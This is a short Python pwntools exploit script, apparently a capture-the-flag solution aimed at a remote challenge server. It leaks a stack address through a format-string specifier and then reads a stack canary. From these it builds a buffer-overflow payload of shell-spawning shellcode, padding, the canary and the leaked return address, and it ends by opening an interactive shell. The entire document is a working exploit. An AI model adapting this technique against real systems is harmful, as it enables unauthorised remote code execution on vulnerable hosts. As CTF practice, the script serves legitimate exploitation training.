from pwn import *
context.arch = "amd64"
#p = process("./main")
p = remote("0.cloud.chals.io",12185)
shell = asm(shellcraft.sh())
p.sendline("%15$p")
p.recvuntil("This might help you out: ")
leak = int(p.recvline().strip(b"\n"), 16)
print(hex(leak))
canary = int(p.recv(18), 16)
print(hex(canary))
#print(p.recvline())
payload = shell
payload += b"A" * (72- len(shell))
payload += p64(canary) + p64(0)
payload += p64(leak)
p.sendline(payload)
p.interactive()
